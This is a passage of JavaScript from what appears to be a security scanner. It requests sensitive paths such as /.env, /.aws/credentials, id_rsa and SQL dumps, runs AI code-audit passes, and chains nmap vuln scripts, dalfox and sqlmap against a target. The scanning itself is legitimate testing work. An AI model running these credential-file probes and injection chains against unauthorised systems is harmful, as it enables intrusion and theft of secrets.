      this.log(scanId, 'warn', `Header audit warning: ${err.message}`)
    }

    // 2. SPA catch-all detection — if every path returns identical 200 HTML, skip enumeration
    let isSpaCatchAll = false
    try {
      const probe1 = await fetch(`${targetUrl.replace(/\/$/, '')}/__spa_probe_${Date.now()}__.html`, { method: 'GET', signal: AbortSignal.timeout(5000) })
      const probe2 = await fetch(`${targetUrl.replace(/\/$/, '')}/__spa_probe_${Date.now() + 1}__.html`, { method: 'GET', signal: AbortSignal.timeout(5000) })
      if (probe1.status === 200 && probe2.status === 200) {
        const t1 = (await probe1.text()).slice(0, 500)
        const t2 = (await probe2.text()).slice(0, 500)
        if (t1 === t2 && t1.length > 100) {
          isSpaCatchAll = true
          this.log(scanId, 'info', '📱 SPA catch-all routing detected — skipping path enumeration (all paths return index.html)')
        }
      }
    } catch { /* non-fatal */ }

    // 3. Audit Sensitive Paths (expanded for offensive coverage) — skip if SPA
    if (!isSpaCatchAll) {
    const paths = ['/robots.txt', '/.git/HEAD', '/.env', '/sitemap.xml',
      '/.git/config', '/.svn/entries', '/backup.zip', '/backup.tar.gz', '/db.sql', '/dump.sql',
      '/phpinfo.php', '/server-status', '/actuator', '/actuator/env', '/actuator/heapdump',
      '/.well-known/security.txt', '/wp-config.php.bak', '/config.php.bak', '/web.config',
      '/api/.env', '/storage/logs/laravel.log', '/debug/vars', '/metrics', '/.DS_Store',
      '/crossdomain.xml', '/clientaccesspolicy.xml', '/elmah.axd', '/trace.axd',
      '/.aws/credentials', '/.dockercfg', '/id_rsa', '/id_ed25519', '/known_hosts',
      '/.htaccess', '/.htpasswd', '/wp-json/wp/v2/users', '/.tgitconfig',
      '/WEB-INF/web.xml', '/META-INF/maven', '/package.json', '/composer.json',
      '/console', '/admin/login', '/administrator', '/wp-admin', '/user/login',
      '/api/users', '/graphql', '/graphiql', '/.vscode/sftp.json', '/.idea/workspace.xml']
    for (const p of paths) {
      await this.waitIfPaused(scanId)
      try {
        const checkUrl = `${targetUrl.replace(/\/$/, '')}${p}`
        const res = await fetch(checkUrl, { method: 'GET' })
        if (res.status === 200) {
          const text = await res.text()
          if (p === '/.git/HEAD' && text.includes('ref:')) {
            await this.ingestFinding(scanId, {
              title: 'Exposed Git Repository (/.git/HEAD)',
              severity: 'high',
              cweId: 'CWE-538',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Exposed Git directory discovered at ${checkUrl}. Attackers can download the entire source code history.`,
              remediation: 'Block access to /.git in your web server configuration.',
              module: 'path-enum',
            }, { verify })
          } else if ((p === '/.env' || p === '/api/.env') && (text.includes('DB_') || text.includes('SECRET') || text.includes('KEY'))) {
            await this.ingestFinding(scanId, {
              title: `Exposed Environment Credentials File (${p})`,
              severity: 'critical',
              cweId: 'CWE-200',
              owaspCategory: 'A01:2021-Broken Access Control',
              description: `Exposed environment file at ${checkUrl} containing sensitive credentials/secrets.`,
              remediation: 'Remove public access to the .env file immediately and rotate all secrets it contains.',
              module: 'path-enum',
            }, { verify })
          } else if (p === '/.git/config' && text.includes('[core]')) {
            await this.ingestFinding(scanId, {
              title: 'Exposed Git Config (/.git/config)',
              severity: 'high',
              cweId: 'CWE-538',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Git config exposed at ${checkUrl} — may disclose repo remotes and branch info; combined with /.git/HEAD the full source can often be reconstructed.`,
              remediation: 'Block access to /.git in your web server configuration.',
              module: 'path-enum',
            }, { verify })
          } else if (/backup\.(zip|tar\.gz)|dump\.sql|db\.sql/.test(p) && text.length > 100) {
            await this.ingestFinding(scanId, {
              title: `Exposed Backup/Database Dump (${p})`,
              severity: 'critical',
              cweId: 'CWE-530',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `A backup archive or SQL dump is publicly downloadable at ${checkUrl} (${text.length} bytes). This typically exposes full source code or database contents including credentials.`,
              remediation: 'Remove backup artifacts from the web root immediately and rotate any credentials they contain.',
              module: 'path-enum',
              evidence: { url: checkUrl, bytes: text.length },
            }, { verify })
          } else if (p === '/phpinfo.php' && /php version|<title>phpinfo/i.test(text)) {
            await this.ingestFinding(scanId, {
              title: 'phpinfo() Page Exposed',
              severity: 'medium',
              cweId: 'CWE-200',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `phpinfo() at ${checkUrl} discloses PHP version, loaded modules, paths, and environment variables.`,
              remediation: 'Delete phpinfo.php from production.',
              module: 'path-enum',
            }, { verify })
          } else if (p.startsWith('/actuator') && (text.includes('{') || text.includes('HikariPool'))) {
            await this.ingestFinding(scanId, {
              title: `Spring Boot Actuator Exposed (${p})`,
              severity: p.includes('heapdump') || p.includes('env') ? 'high' : 'medium',
              cweId: 'CWE-200',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Spring Actuator endpoint ${checkUrl} is publicly accessible — can disclose env vars, beans, mappings, or a full heap dump (session tokens, credentials).`,
              remediation: 'Restrict actuator endpoints to management port/internal network and require authentication.',
              module: 'path-enum',
            }, { verify })
          } else if (p === '/server-status' && /apache status|server uptime/i.test(text)) {
            await this.ingestFinding(scanId, {
              title: 'Apache server-status Exposed',
              severity: 'medium',
              cweId: 'CWE-200',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `mod_status page at ${checkUrl} discloses requests, vhosts, and internal IPs.`,
              remediation: 'Disable mod_status or restrict to localhost.',
              module: 'path-enum',
            }, { verify })
          } else if (/laravel\.log|web\.config|wp-config|config\.php\.bak|\.DS_Store|debug\/vars|metrics|\.svn/.test(p) && text.length > 20) {
            await this.ingestFinding(scanId, {
              title: `Sensitive File Exposed (${p})`,
              severity: 'medium',
              cweId: 'CWE-538',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Sensitive file publicly accessible at ${checkUrl} (${text.length} bytes) — may disclose configuration, credentials, stack traces, or internal metrics.`,
              remediation: `Block public access to ${p}.`,
              module: 'path-enum',
              evidence: { url: checkUrl, snippet: text.slice(0, 300) },
            }, { verify })
          } else if (p === '/robots.txt') {
            await this.ingestFinding(scanId, {
              title: 'robots.txt Discovered',
              severity: 'info',
              cweId: 'CWE-200',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Discovered robots.txt containing hidden endpoints:\n${text.slice(0, 300)}`,
              remediation: 'Ensure robots.txt does not disclose sensitive administrative endpoints.',
              module: 'path-enum',
            }, { verify })
          }
        }
      } catch { /* skip */ }
    }
    } // end if (!isSpaCatchAll)
  }

  /** Parse raw tool stdout into structured findings (heuristic + severity extraction).
   *  Returns the final status string: 'ok' | 'failed' | 'skipped' | 'unavailable'. */
  async processToolOutput(scanId, tool, res, { verify, targetType } = {}) {
    const hexFailed = !res || res.success === false
    const hexOut = hexFailed ? '' : `${res.stdout || ''}\n${res.stderr || ''}`.trim()

    // If HexStrike returned 404 or HTTP error, skip directly to native
    const hexHttpError = res?.status && res.status >= 400

    // If HexStrike succeeded with output, use it.
    if (!hexFailed && !hexHttpError && hexOut) {
      this.log(scanId, 'info', `[${tool}] ${hexOut.split('\n').length} lines of output`)
      const { findings, discoveredUrls } = extractFindingsFromOutput(tool, hexOut, this._currentTarget || '')
      this._collectUrls(scanId, discoveredUrls)
      if (!findings.length) {
        this.log(scanId, 'info', `[${tool}] no actionable findings${discoveredUrls.length ? ` (${discoveredUrls.length} URLs queued for chaining)` : ''}`)
        return 'ok'
      }
      for (const f of findings) {
        await this.ingestFinding(scanId, { ...f, module: `hexstrike:${tool}` }, { verify, targetType })
      }
      return 'ok'
    }

    // HexStrike failed, returned 404, or produced no output → try native execution.
    if (hexHttpError) {
      this.log(scanId, 'warn', `[hexstrike:${tool}] HTTP ${res.status} — skipping to native`)
    } else {
      this.log(scanId, 'warn', `[hexstrike:${tool}] ${hexFailed ? `failed: ${res?.error || 'no output'}` : 'no output'} — trying native`)
    }    const native = await runNativeTool(tool, this._currentTarget || '')
    if (!native.success) {
      // Surface the REAL error (exit code + stderr tail) not 'undefined'
      const detail = native.error || `exit ${native.code ?? '?'}${native.stderr ? ` — ${native.stderr.split('\n').slice(-2).join(' | ')}` : ''}`
      this.log(scanId, 'warn', `Tool ${tool} failed natively: ${detail}`)
      return 'failed'
    }
    const nativeOut = `${native.stdout || ''}\n${native.stderr || ''}`.trim()
    if (!nativeOut) {
      this.log(scanId, 'warn', `Tool ${tool} produced no output natively (exit ${native.code ?? 0}, cmd: ${native.bin || tool} ${native.args || ''})`)
      return 'ok'
    }
    this.log(scanId, 'info', `[native:${tool}] ${nativeOut.split('\n').length} lines of output`)
    const { findings, discoveredUrls } = extractFindingsFromOutput(tool, nativeOut, this._currentTarget || '')
    this._collectUrls(scanId, discoveredUrls)
    if (!findings.length) {
      this.log(scanId, 'info', `[native:${tool}] no actionable findings${discoveredUrls.length ? ` (${discoveredUrls.length} URLs queued for chaining)` : ''}`)
      return 'ok'
    }
    for (const f of findings) {
      await this.ingestFinding(scanId, { ...f, module: `native:${tool}` }, { verify, targetType })
    }
    return 'ok'
  }

  /** Store discovered parameterized URLs for the injection-chaining stage. */
  _collectUrls(scanId, urls = []) {
    if (!urls.length) return
    if (!this._urlPool) this._urlPool = new Map()
    const pool = this._urlPool.get(scanId) || new Set()
    for (const u of urls) pool.add(u)
    this._urlPool.set(scanId, pool)
  }

  /** Get + clear the URL pool for a scan (used before dalfox/sqlmap chaining). */
  _drainUrls(scanId) {
    const pool = this._urlPool?.get(scanId)
    return pool ? [...pool] : []
  }

  // ── WHITEBOX ───────────────────────────────────────────────────────────────
  async runWhitebox(scan, { files = [], language = '', focus = '', verify = true, depth = 'standard', dynamicTarget = '', dynamicModules = [] } = {}) {
    const scanId = scan.id
    // Reset & start token tracking for this scan
    this._startTokenTracking(scanId)
    // ALWAYS full offensive: pattern scanner + 5 specialist AI passes + optional dynamic verification
    this.log(scanId, 'info', `▶ Whitebox static analysis started (${files.length} files, depth=offensive)`)
    if (!files.length) {
      this.log(scanId, 'warn', 'No source files provided for whitebox analysis')
      this.finish(scanId, 'failed')
      return
    }

    const hasDynamic = !!(dynamicTarget && dynamicTarget.trim())
    if (hasDynamic) {
      this.log(scanId, 'info', `🌐 Hybrid mode: dynamic verification against ${dynamicTarget}${dynamicModules.length ? ` (modules: ${dynamicModules.join(', ')})` : ''}`)
    }

    // ── Structured whitebox metadata for the "Audit Details" section ──
    const whiteboxMeta = {
      totalFiles: files.length,
      language: language || 'auto-detected',
      filesChecked: files.map(f => ({ path: f.path, size: String(f.content || '').length })),
      passes: [],
    }
    /** Persist whitebox metadata so the frontend can render the Audit Details section. */
    const _saveWhiteboxMeta = () => {
      try {
        db.run(`UPDATE scans SET whitebox_meta = ? WHERE id = ?`, JSON.stringify(whiteboxMeta), scanId)
      } catch { /* non-critical */ }
    }

    try {
      let totalStored = 0
      this.progress(scanId, 2)

      // PASS 0: fast deterministic pattern scan (no AI) — always runs
      const patStart = Date.now()
      this.log(scanId, 'info', '⚔️ Pattern scanner: secrets / dangerous functions / insecure config...')
      const patFindings = this._patternScan(files)
      const patMs = Date.now() - patStart
      this.log(scanId, 'info', `⚔️ Pattern scanner produced ${patFindings.length} candidates (${(patMs / 1000).toFixed(1)}s)`)
      whiteboxMeta.passes.push({ tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' })
      _saveWhiteboxMeta()
      let done = 0
      for (const f of patFindings) {
        await this.waitIfPaused(scanId)
        const stored = await this.ingestFinding(scanId, f, { verify, targetType: 'code' })
        if (stored) totalStored++
        done++
        if (patFindings.length) this.progress(scanId, 2 + (done / patFindings.length) * 13)
      }
      this.progress(scanId, 15)

      // 5 specialist AI audit passes — each covers specific OWASP Top 10 (2025)
      // categories. Processed in parallel (5 concurrent workers in auditCode)
      const passes = [
        { tag: 'A05-injection', focus: `${focus || 'security'} — A05:2025 Injection. SQLi, NoSQLi, command injection, XSS (reflected/stored/DOM), template injection (SSTI), LDAP injection, XPath injection, unsafe eval/exec/Function(), deserialization. Trace user input to dangerous sinks.` },
        { tag: 'A01-access-misconfig', focus: `${focus || 'security'} — A01:2025 Broken Access Control + A02:2025 Security Misconfiguration. IDOR, missing @UseGuards/@Roles, privilege escalation, CORS wildcard, missing security headers (HSTS/CSP/X-Frame), debug endpoints, verbose errors, directory listing, default credentials, exposed .env/git.` },
        { tag: 'A04-A07-crypto-auth', focus: `${focus || 'security'} — A04:2025 Cryptographic Failures + A07:2025 Authentication Failures. Hardcoded secrets/keys/passwords, weak hash (MD5/SHA1), weak ciphers, JWT misuse (none alg, long expiry, weak secret), missing MFA, session fixation, credential stuffing.` },
        { tag: 'A06-A08-design-integrity', focus: `${focus || 'security'} — A06:2025 Insecure Design + A08:2025 Software/Data Integrity Failures. Missing rate limiting, missing input validation, unsafe deserialization (pickle/yaml.load), prototype pollution, missing integrity checks, insecure defaults.` },
        { tag: 'A03-A09-A10-OTH-components-logging-ssrf', focus: `${focus || 'security'} — A03:2025 Software Supply Chain + A09:2025 Logging Failures + A10:2025 Exceptional Conditions + OTH. Outdated deps, known CVE patterns, sensitive data logged (passwords/tokens/secrets), missing audit logging, SSRF via user-controlled URLs (fetch/axios/requests), unhandled exceptions leaking stack traces, path traversal, XXE.` },
      ]

      // AI passes span 15% → 97%
      const aiStart = 15, aiEnd = 97
      for (let pi = 0; pi < passes.length; pi++) {
        const p = passes[pi]
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `🤖 AI audit pass: ${p.tag}`)
        const passBase = aiStart + (pi / passes.length) * (aiEnd - aiStart)
        this.progress(scanId, passBase)

        const aiPassStart = Date.now()
        try {
          // Safety timeout of 1800 seconds (30 min) per AI pass. The audit now
          // covers the complete collected source set rather than an accidental
          // 50-file subset.
          const passLog = (level, msg) => this.log(scanId, level, msg)
          const passPromise = aiEngine.auditCode(files, { language, focus: p.focus, log: passLog })
          const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Pass timed out after 1800s')), 1800000))
          const { agent, findings } = await Promise.race([passPromise, timeoutPromise])
          const aiMs = Date.now() - aiPassStart

          this.log(scanId, 'info', `🤖 [${agent}] ${p.tag} pass produced ${findings.length} candidate findings (${(aiMs / 1000).toFixed(1)}s)`)
          whiteboxMeta.passes.push({ tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' })
          _saveWhiteboxMeta()
          let done = 0
          for (const f of findings) {
            await this.waitIfPaused(scanId)
            // Resolve truncated file paths against the full file list
            const fullPath = resolveFilePath(f.file, files)
            const stored = await this.ingestFinding(scanId, {
              title: f.title,
              severity: f.severity,
              cweId: f.cwe,
              owaspCategory: f.owasp,
              description: `${f.description}${fullPath ? ` (in ${fullPath}${f.line ? `:${f.line}` : ''})` : ''}`,
              remediation: f.remediation,
              module: `code-audit:${agent}:${p.tag}`,
              evidence: { file: fullPath, line: f.line, code: f.evidence },
            }, { verify, targetType: 'code' })
            if (stored) totalStored++
            done++
            if (findings.length) this.progress(scanId, passBase + (done / findings.length) * ((aiEnd - aiStart) / passes.length))
          }
        } catch (e) {
          const aiMs = Date.now() - aiPassStart
          this.log(scanId, 'warn', `⚠️ AI audit pass ${p.tag} failed: ${e.message}`)
          whiteboxMeta.passes.push({ tool: 'AI engine', type: p.tag, findings: 0, durationMs: aiMs, status: 'failed', error: e.message })
          _saveWhiteboxMeta()
        }
      }

      // ── DYNAMIC VERIFICATION PHASE (hybrid mode) ──
      // When a live target is provided, run blackbox-style tools against it
      // to confirm code-level findings with runtime evidence.
      if (hasDynamic) {
        this.log(scanId, 'info', `🌐 Dynamic verification phase starting against ${dynamicTarget}`)
        this.progress(scanId, 90)

        const dynModules = dynamicModules.length
          ? dynamicModules
          : ['nmap', 'nikto', 'nuclei', 'ffuf', 'whatweb', 'katana', 'arjun', 'dalfox']

        // 1. HTTP baseline (headers + sensitive paths)
        const baselineStart = Date.now()
        await this.auditHttpBaseline(scanId, dynamicTarget, { verify, targetType: 'url' })
        whiteboxMeta.passes.push({ tool: 'HTTP Baseline', type: 'dynamic', findings: 0, durationMs: Date.now() - baselineStart, status: 'completed' })
        _saveWhiteboxMeta()

        // 2. Run dynamic tools
        const engine = await hexstrike.engineStatus()
        let dynToolCount = 0
        for (const mod of dynModules) {
          await this.waitIfPaused(scanId)
          const mapping = hexstrike.MODULE_TOOL_MAP[mod]
          if (!mapping) {
            this.log(scanId, 'warn', `⏭ Unknown dynamic module: ${mod}`)
            continue
          }
          const params = mapping.params(dynamicTarget)
          if (mod === 'nmap') {
            params.scan_type = '-sCV --script vuln'
            params.additional_args = '-T4 -Pn --script-timeout 3m'
          }
          if (mod === 'ffuf') {
            params.wordlist = '/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt'
          }
          this.log(scanId, 'info', `🌐 Dynamic tool: ${mod}`)
          const t0 = Date.now()
          let res = engine.available && !mapping.nativeOnly
            ? await hexstrike.runTool(mapping.tool, params)
            : { success: false, error: 'native-only or engine offline', _skipHex: true }
          const t1 = Date.now()
          const finalStatus = await this.processToolOutput(scanId, mod, res, { verify, targetType: 'url' })
          whiteboxMeta.passes.push({ tool: mod, type: 'dynamic', findings: 0, durationMs: t1 - t0, status: finalStatus || 'completed', error: res?.error || null })
          _saveWhiteboxMeta()
          dynToolCount++
          this.progress(scanId, 90 + (dynToolCount / dynModules.length) * 7)
        }

        // 3. Injection chaining (feed discovered URLs into dalfox + sqlmap)
        await this.chainInjectionTests(scanId, { verify, targetType: 'url', offensive: true })
        whiteboxMeta.passes.push({ tool: 'Injection Chaining', type: 'dynamic', findings: 0, durationMs: 0, status: 'completed' })
        _saveWhiteboxMeta()
        this.progress(scanId, 98)

        // 4. Advanced attack vectors
        await this._probeAdvancedAttackVectors(scanId, dynamicTarget, { verify })
        whiteboxMeta.passes.push({ tool: 'Advanced Attack Vectors', type: 'dynamic', findings: 0, durationMs: 0, status: 'completed' })
        _saveWhiteboxMeta()

        // 5. OffSec payload matching against collected responses
        await this._matchOffsecPayloads(scanId)
        await this._scanResponseBodies(scanId, dynamicTarget, { verify })
        await this._auditCookiesCors(scanId, dynamicTarget, { verify })
        whiteboxMeta.passes.push({ tool: 'Payload Matching + Response Scan', type: 'dynamic', findings: 0, durationMs: 0, status: 'completed' })
        _saveWhiteboxMeta()

        this.log(scanId, 'info', `✅ Dynamic verification phase complete`)
      }

      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Whitebox audit warning: ${e.message}`)
      this.finish(scanId, 'completed')
    }
  }

  /**
   * Retry only the FAILED passes from the previous whitebox scan.
   * Reads whitebox_meta to find which passes failed, then re-runs them.
   * If the pattern scanner also failed (unlikely), re-runs it too.
   */
  async retryFailedWhitebox(scan, { files = [], language = '', focus = '', verify = true } = {}) {
    const scanId = scan.id
    this.log(scanId, 'info', `🔁 Retrying failed whitebox passes on ${files.length} files...`)

    // Load previous metadata to find failed passes
    let prevMeta = { passes: [], totalFiles: files.length }
    try {
      const row = db.get(`SELECT whitebox_meta FROM scans WHERE id = ?`, scanId)
      if (row?.whitebox_meta) prevMeta = JSON.parse(row.whitebox_meta)
    } catch { /* use defaults */ }

    const failedPasses = (prevMeta.passes || []).filter(p => p.status === 'failed')
    if (!failedPasses.length) {
      this.log(scanId, 'info', 'No failed passes to retry — all passes completed successfully')
      this.finish(scanId, 'completed')
      return
    }
    this.log(scanId, 'info', `Found ${failedPasses.length} failed pass(es) to retry: ${failedPasses.map(p => p.type).join(', ')}`)

    // Build the whitebox metadata for this retry (append to existing)
    let existingMeta = prevMeta
    try {
      const row = db.get(`SELECT whitebox_meta FROM scans WHERE id = ?`, scanId)
      if (row?.whitebox_meta) existingMeta = JSON.parse(row.whitebox_meta)
    } catch { existingMeta = prevMeta }

    const _saveWhiteboxMeta = () => {
      try { db.run(`UPDATE scans SET whitebox_meta = ? WHERE id = ?`, JSON.stringify(existingMeta), scanId) } catch { }
    }

    // Map of all 5 pass definitions (same as runWhitebox)
    const ALL_PASSES = {
      'A03-injection': { tag: 'A03-injection', focus: `${focus || 'security'} — A03: Injection. SQLi, NoSQLi, command injection, XSS (reflected/stored/DOM), template injection (SSTI), LDAP injection, XPath injection, unsafe eval/exec/Function(), deserialization. Trace user input to dangerous sinks.` },
      'A01-A05-access-misconfig': { tag: 'A01-A05-access-misconfig', focus: `${focus || 'security'} — A01: Broken Access Control + A05: Security Misconfiguration. IDOR, missing @UseGuards/@Roles, privilege escalation, CORS wildcard, missing security headers (HSTS/CSP/X-Frame), debug endpoints, verbose errors, directory listing, default credentials.` },
      'A02-A07-crypto-auth': { tag: 'A02-A07-crypto-auth', focus: `${focus || 'security'} — A02: Cryptographic Failures + A07: Authentication Failures. Hardcoded secrets/keys/passwords, weak hash (MD5/SHA1), weak ciphers, JWT misuse (none alg, long expiry, weak secret), missing MFA, session fixation, credential stuffing.` },
      'A04-A08-design-integrity': { tag: 'A04-A08-design-integrity', focus: `${focus || 'security'} — A04: Insecure Design + A08: Software Integrity Failures. Missing rate limiting, missing input validation, unsafe deserialization (pickle/yaml.load), prototype pollution, missing integrity checks, insecure defaults.` },
      'A06-A09-A10-components-logging-ssrf': { tag: 'A06-A09-A10-components-logging-ssrf', focus: `${focus || 'security'} — A06: Vulnerable Components + A09: Logging Failures + A10: SSRF. Outdated deps, known CVE patterns, sensitive data logged (passwords/tokens/secrets), missing audit logging, SSRF via user-controlled URLs (fetch/axios/requests).` },
    }

    try {
      let totalStored = 0
      // Re-run pattern scanner only if it's marked as failed
      const patFailed = failedPasses.find(p => p.type === 'deterministic')
      if (patFailed) {
        this.progress(scanId, 2)
        const patStart = Date.now()
        this.log(scanId, 'info', '⚔️ Retrying: Pattern scanner...')
        const patFindings = this._patternScan(files)
        const patMs = Date.now() - patStart
        this.log(scanId, 'info', `⚔️ Pattern scanner produced ${patFindings.length} candidates (${(patMs / 1000).toFixed(1)}s)`)
        // Update the existing pass entry
        const idx = existingMeta.passes.findIndex(p => p.type === 'deterministic' && p.status === 'failed')
        if (idx >= 0) existingMeta.passes[idx] = { tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' }
        else existingMeta.passes.push({ tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' })
        _saveWhiteboxMeta()
        let done = 0
        for (const f of patFindings) {
          await this.waitIfPaused(scanId)
          const stored = await this.ingestFinding(scanId, f, { verify, targetType: 'code' })
          if (stored) totalStored++
          done++
          if (patFindings.length) this.progress(scanId, 2 + (done / patFindings.length) * 13)
        }
      }
      this.progress(scanId, 15)

      // Re-run only failed AI passes
      const aiFailed = failedPasses.filter(p => p.type !== 'deterministic')
      const aiStart = 15, aiEnd = 97
      for (let pi = 0; pi < aiFailed.length; pi++) {
        const failed = aiFailed[pi]
        const p = ALL_PASSES[failed.type]
        if (!p) {
          this.log(scanId, 'warn', `Unknown pass type "${failed.type}" — skipping`)
          continue
        }
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `🤖 Retrying AI audit pass: ${p.tag}`)
        const passBase = aiStart + (pi / aiFailed.length) * (aiEnd - aiStart)
        this.progress(scanId, passBase)

        const aiPassStart = Date.now()
        try {
          const passPromise = aiEngine.auditCode(files, { language, focus: p.focus, log: (level, msg) => this.log(scanId, level, msg) })
          const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Pass timed out after 900s')), 900000))
          const { agent, findings } = await Promise.race([passPromise, timeoutPromise])
          const aiMs = Date.now() - aiPassStart

          this.log(scanId, 'info', `🤖 [${agent}] ${p.tag} retry produced ${findings.length} candidate findings (${(aiMs / 1000).toFixed(1)}s)`)
          // Update the existing failed pass entry
          const idx = existingMeta.passes.findIndex(e => e.type === p.tag && e.status === 'failed')
          if (idx >= 0) existingMeta.passes[idx] = { tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' }
          else existingMeta.passes.push({ tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' })
          _saveWhiteboxMeta()
          let done = 0
          for (const f of findings) {
            await this.waitIfPaused(scanId)
            // Resolve truncated file paths against the full file list
            const fullPath = resolveFilePath(f.file, files)
            const stored = await this.ingestFinding(scanId, {
              title: f.title,
              severity: f.severity,
              cweId: f.cwe,
              owaspCategory: f.owasp,
              description: `${f.description}${fullPath ? ` (in ${fullPath}${f.line ? `:${f.line}` : ''})` : ''}`,
              remediation: f.remediation,
              module: `code-audit:${agent}:${p.tag}`,
              evidence: { file: fullPath, line: f.line, code: f.evidence },
            }, { verify, targetType: 'code' })
            if (stored) totalStored++
            done++
            if (findings.length) this.progress(scanId, passBase + (done / findings.length) * ((aiEnd - aiStart) / aiFailed.length))
          }
        } catch (e) {
          const aiMs = Date.now() - aiPassStart
          this.log(scanId, 'warn', `⚠️ AI retry pass ${p.tag} still failed: ${e.message}`)
          const idx = existingMeta.passes.findIndex(e => e.type === p.tag && e.status === 'failed')
          if (idx >= 0) existingMeta.passes[idx] = { ...existingMeta.passes[idx], durationMs: (existingMeta.passes[idx].durationMs || 0) + aiMs, error: e.message }
          _saveWhiteboxMeta()
        }
      }

      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Retry failed whitebox warning: ${e.message}`)
      this.finish(scanId, 'completed')
    }
  }

  /**
   * Retry only the FAILED native tools from a blackbox scan.
   * Parses logs for "Tool X failed natively" messages to identify failed tools.
   */
  async retryFailedBlackbox(scan, { verify = true, modules = [] } = {}) {
    const scanId = scan.id
    const target = scan.target
    this._currentTarget = target
    this.log(scanId, 'info', `🔁 Retrying failed blackbox tools on ${target}...`)

    const failedTools = new Set()

    // 1. Check scan.blackbox_meta saved JSON for tools marked as status: 'failed'
    try {
      if (scan.blackbox_meta) {
        const meta = JSON.parse(scan.blackbox_meta)
        if (Array.isArray(meta.tools)) {
          for (const t of meta.tools) {
            if (t.status === 'failed' || t.error) failedTools.add(t.tool)
          }
        }
      }
    } catch { /* ignore parse error */ }

    // 2. Also check logs for regex matches like "Tool X failed natively" or "Tool X failed"
    const logs = db.all(`SELECT message FROM logs WHERE scan_id = ? ORDER BY id`, scanId)
    for (const l of logs) {
      const m = l.message.match(/Tool (\S+)\s+(?:failed|errored)/i)
      if (m && m[1]) failedTools.add(m[1])
    }

    if (!failedTools.size) {
      this.log(scanId, 'info', 'No failed tools detected — nothing to retry')
      this.finish(scanId, 'completed')
      return
    }

    const tools = [...failedTools]
    this.log(scanId, 'info', `Found ${tools.length} failed tool(s) to retry: ${tools.join(', ')}`)

    try {
      // Re-initialize blackboxMeta object for tracking status
      let meta = { tools: [], subdomains: [], urls: [], totalUrls: 0 }
      try { if (scan.blackbox_meta) meta = JSON.parse(scan.blackbox_meta) } catch { }
      this._blackboxMeta.set(scanId, meta)

      let done = 0
      for (const tool of tools) {
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `▶ Retrying: ${tool}`)
        try {
          const res = await runNativeTool(tool, target)
          // Update status in metadata
          if (Array.isArray(meta.tools)) {
            const idx = meta.tools.findIndex(t => t.tool === tool)
            const updatedItem = {
              tool,
              status: (res.success || res.stdout) ? 'ok' : 'failed',
              error: (res.success || res.stdout) ? null : (res.error || 'Execution failed'),
              durationMs: res.durationMs || 0
            }
            if (idx >= 0) meta.tools[idx] = updatedItem
            else meta.tools.push(updatedItem)
          }
          await this.processToolOutput(scanId, tool, res, { verify, targetType: scan.target_type })
        } catch (e) {
          this.log(scanId, 'warn', `Retry ${tool} still failed: ${e.message}`)
        }
        done++
        this.progress(scanId, 25 + (done / tools.length) * 75)
      }

      // Save updated blackbox_meta back to DB
      db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(meta), scanId)
      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Retry blackbox warning: ${e.message}`)
      this.finish(scanId, 'completed')
    }
  }

  /**
   * Deterministic pattern scanner — no AI. Matches known-bad code patterns:
   * hardcoded secrets, dangerous function calls, insecure configuration.
   * Every finding is grounded in an exact code line (file + line number).
   */
  _patternScan(files) {
    // ── Layman-impact explanations per vulnerability category ──
    const IMPACT = {
      'A03:2021-Injection': 'An attacker can inject malicious commands or code into the application. For SQL injection, this means reading/modifying/deleting the entire database — including stealing all user passwords, credit card numbers, and private data. For command injection, the attacker can run any command on the server, potentially taking full control of the machine.',
      'A01:2021-Broken Access Control': 'A normal user can access someone else\'s data or perform admin-only actions just by changing a number in the URL (e.g. /user/1 → /user/2). An attacker can view, modify, or delete other users\' private information, or escalate to admin privileges without authorization.',
      'A02:2021-Cryptographic Failures': 'Sensitive data like passwords, session tokens, or personal information is not properly protected. An attacker who intercepts network traffic or gains access to the database can read passwords in plain text, impersonate users, or decrypt supposedly secure communications.',
      'A04:2021-Insecure Design': 'The application lacks proper security controls by design. Missing rate limiting allows attackers to try thousands of passwords per second. Missing validation allows malicious file uploads or impossible data values. These are structural flaws that cannot be fixed by patching a single line of code.',
      'A05:2021-Security Misconfiguration': 'The server or application is set up insecurely. Debug pages leak internal paths and secrets. Default admin passwords are still in use. Unnecessary features are enabled. CORS misconfiguration allows any website to make authenticated requests on behalf of your users. An attacker can exploit these oversights to gain deeper access.',
      'A06:2021-Vulnerable and Outdated Components': 'The application uses libraries or frameworks with known security vulnerabilities. Attackers can use publicly available exploits to compromise the application without needing to find a new vulnerability — they just run an existing attack script.',
      'A07:2021-Identification and Authentication Failures': 'The login system is weak. An attacker can brute-force passwords (try thousands of combinations until one works), use default credentials (admin/admin), or steal session tokens to impersonate legitimate users. Without multi-factor authentication, a single leaked password grants full access.',
